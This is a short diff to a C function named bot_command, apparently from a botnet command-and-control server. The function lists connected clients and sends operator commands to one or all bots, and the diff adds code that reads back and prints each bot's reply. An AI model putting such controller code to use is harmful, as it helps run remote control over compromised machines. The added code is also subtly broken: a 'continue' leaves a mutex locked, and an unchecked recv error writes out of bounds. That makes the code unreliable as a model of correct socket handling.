@@ -192,9 +192,13 @@ void* bot_command(void *args_main)
         // Display current list of connections
         if (strcmp(data, "show") == 0)
         {
-
             // Set lock
             pthread_mutex_lock(&mutex);
+            if (args->fd_count == 1)
+            {
+                continue;
+            }
+            
 
             // Iterate through array and print client information
             for (int i = 0; i < args->fd_count; i++)
@@ -219,9 +223,24 @@ void* bot_command(void *args_main)
             pthread_mutex_lock(&mutex);
 
             // Iterate through array, omitting listener, and send data to each file descriptor
+            // Should we thread this? It would "unblock" the terminal if a client fails to send.
             for (int i = 1; i < args->fd_count; i++)
             {
+                // Send the data
                 send(args->pfds[i].fd, data, sizeof(data), 0);
+
+                // Wait for a response
+                char recieved_data[8192];
+                int bytes_recv = recv(args->pfds[i].fd, recieved_data, 8192, 0);
+
+                if (bytes_recv == 0)
+                {
+                    // Oops, our recv call failed.
+                    printf("[-] Unable to recieve from Client %d\n", i);
+                }
+
+                recieved_data[bytes_recv] = '\0';
+                printf("Client %d said: %s\n", i, recieved_data);
             }
 
             // Release lock
@@ -248,6 +267,19 @@ void* bot_command(void *args_main)
 
             // Send data to client specified by user input, based on array index
             send(args->pfds[num].fd, data, sizeof(data), 0);
+
+            // Wait for a response
+            char recieved_data[8192];
+            int bytes_recv = recv(args->pfds[num].fd, recieved_data, 8192, 0);
+
+            if (bytes_recv == 0)
+            {
+                // Oops, our recv call failed.
+                printf("[-] Unable to recieve from Client %d\n", num);
+            }
+            
+            recieved_data[bytes_recv] = '\0';
+            printf("Client %d said: %s\n", num, recieved_data);
 
             // Release lock
             pthread_mutex_unlock(&mutex);
